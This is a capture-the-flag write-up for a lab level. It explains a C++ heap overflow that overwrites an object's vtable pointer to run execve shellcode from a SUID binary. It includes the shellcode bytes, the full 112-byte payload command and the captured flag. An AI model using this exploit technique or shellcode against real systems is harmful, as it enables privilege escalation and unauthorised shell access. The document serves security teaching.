# Level 9

Same recon as level0: SUID **bonus0**. It is a C++ binary, and **NX is disabled** here (unique to this level, `GNU_STACK` is `RWE`), so bytes we write on the heap can be executed as code.

## Analysis

```cpp
class N {
    // (hidden) void *vtable;   compiler adds this because N has virtual methods
    char annotation[100];
    int  value;
public:
    N(int v) : value(v) {}
    virtual int operator+(N &other) { return value + other.value; }
    virtual int operator-(N &other) { return value - other.value; }
    void setAnnotation(char *s) { memcpy(annotation, s, strlen(s)); }  // no bound check
};

int main(int argc, char **argv) {
    if (argc < 2) _exit(1);
    N *a = new N(5);
    N *b = new N(6);
    a->setAnnotation(argv[1]);   // copies argv[1] with no size limit
    *b + *a;                     // calls b->operator+(a), a VIRTUAL call
    return 0;
}
```

Two things make this exploitable:

1. `setAnnotation` does `memcpy(annotation, s, strlen(s))` with no size check, so a long `argv[1]` writes past `annotation` and keeps going.
2. `*b + *a` is a **virtual** call, so the program reaches the function to run by following pointers that live inside object `b`. If our overflow reaches `b` and rewrites those pointers, we choose what runs.

### The object layout of N

Because `N` has virtual methods, the compiler puts a hidden **vtable pointer** as the very first field of every `N` object. So each object is 108 bytes (`0x6c`) laid out like this:

```
offset 0    : vtable pointer   (4 bytes)   <- points to the table of virtual functions
offset 4    : annotation[100]              <- setAnnotation writes starting HERE
offset 104  : value            (4 bytes)
```

The important part: `setAnnotation` writes at `annotation`, which is offset **4**, not offset 0. The vtable pointer sits before it, at offset 0.

### What a virtual call really does (two hops)

Reuse the mailbox idea from level7. A pointer is a mailbox holding a note that says "go to address X". A virtual call follows **two** notes in a row:

```
   object b --note--> vtable --note--> function --> run it
   (hop 1: read the vtable pointer)  (hop 2: read the first function pointer)
```

In assembly (`objdump -d`), the `*b + *a` call is exactly these two hops:

```asm
mov    0x10(%esp),%eax   ; eax = b            (the object)
mov    (%eax),%eax       ; eax = *b           hop 1: b's vtable pointer
mov    (%eax),%edx       ; edx = *(vtable)    hop 2: first function in the vtable
...
call   *%edx             ; run that function
```

So the function that runs is `*(*b)`: dereference `b` to get the vtable, dereference the vtable to get the function pointer, call it. If we control the value at `b` (hop 1's note) and the value it points to (hop 2's note), we control what `call` runs. Both notes are things we can plant, because the overflow from `a` reaches into `b`, and `a`'s own memory is ours too.

## Recovering a and b in gdb (same idea as level6/7)

In level6/7 we broke right after each `call malloc` and read the pointer from `eax`. C++ is the same: `new N(5)` compiles to `operator new(0x6c)` (the mangled symbol `_Znwj`, which is basically `malloc`) followed by the constructor. `operator new` returns its pointer in `eax`, so we break right after each one:

```asm
8048617: call 8048530 <_Znwj@plt>   ; operator new(0x6c) for a
804861c: mov  %eax,%ebx             ; <- break here, eax = a
...
8048639: call 8048530 <_Znwj@plt>   ; operator new(0x6c) for b
804863e: mov  %eax,%ebx             ; <- break here, eax = b
```

```
(gdb) b *0x0804861c        # after operator new for a
(gdb) b *0x0804863e        # after operator new for b
(gdb) run AAAA
Breakpoint 1 ...
(gdb) p/x $eax
$1 = 0x804a008             <- a
(gdb) c
Breakpoint 2 ...
(gdb) p/x $eax
$2 = 0x804a078             <- b
(gdb) p/d $2 - $1
$3 = 112
```

So `a = 0x0804a008`, `b = 0x0804a078`, and they are `0x70` = **112 bytes** apart (108 bytes for object `a` plus 4 bytes of `b`'s chunk header). The absolute addresses can shift outside gdb, but the 112 byte gap is fixed, and that gap is all the payload needs.

### From a's annotation to b's vtable pointer

`setAnnotation` starts writing at `a`'s `annotation`, which is `a + 4 = 0x0804a00c`. The target we want to overwrite is `b`'s vtable pointer, which is `b + 0 = 0x0804a078`. The distance between them:

```
   0x0804a078   (b's vtable pointer)
 - 0x0804a00c   (where setAnnotation starts writing)
 -----------
   0x0000006c = 108
```

So the byte at payload offset **108** lands exactly on `b`'s vtable pointer. Everything before it is padding plus the pieces we plant.

## Exploit

### The plan

The virtual call runs `*(*b)`. We want it to run our shellcode. So we need to set up two notes:

- **hop 1:** make `*b` point to a 4-byte slot we control (a "fake vtable").
- **hop 2:** put the shellcode's address in that slot.

We have plenty of room inside `a`'s memory (annotation + value), which we fully control, so we store the shellcode there, and we also store the fake vtable entry there. Then we overwrite `b`'s vtable pointer to point at our fake entry.

### Shellcode (45 bytes)

Same Aleph One shellcode as level2 ([source](https://fr.wikipedia.org/wiki/Shellcode)); it zeroes `edx` so `execve`'s `envp` is valid, and it has no null bytes so it survives as a command-line argument:

```
\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
```

### Payload (112 bytes)

Payload byte at offset `k` is written to address `0x0804a00c + k` (because writing starts at `a + 4`). Using that, here is what goes where:

```
offset   0..44  : shellcode              -> lands at 0x0804a00c        (a + 4)
offset  45..99  : 55 'A' padding
offset 100..103 : 0x0804a00c             -> fake vtable entry, lands at 0x0804a070 (a + 104)
offset 104..107 : 4 'A'                  -> overwrites b's chunk header (harmless, b is never freed)
offset 108..111 : 0x0804a070             -> new value of b's vtable pointer, lands at 0x0804a078 (b + 0)
```

- The **fake vtable entry** (the 4 bytes at offset 100) sits at `0x0804a070` and holds `0x0804a00c`, the shellcode address.
- The **new vtable pointer** (offset 108) overwrites `b`'s first field with `0x0804a070`, the address of that fake entry.

### The runtime chain

```
   call *%edx   where edx = *(*b)

   hop 1:  *b            = 0x0804a070   (we wrote this at b+0)
   hop 2:  *(0x0804a070) = 0x0804a00c   (our fake vtable entry, at a+104)
   call    0x0804a00c    -> shellcode   (sitting at a+4)
   -> /bin/sh
```

### Run

```bash
./level9 "$(python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "A"*55 + "\x0c\xa0\x04\x08" + "AAAA" + "\x70\xa0\x04\x08"')"
cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

- `\x0c\xa0\x04\x08` = `0x0804a00c` (shellcode / fake vtable entry), little-endian.
- `\x70\xa0\x04\x08` = `0x0804a070` (fake vtable), little-endian.
- The payload has no null bytes, so it passes through as `argv[1]` intact.

Flag: `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728`
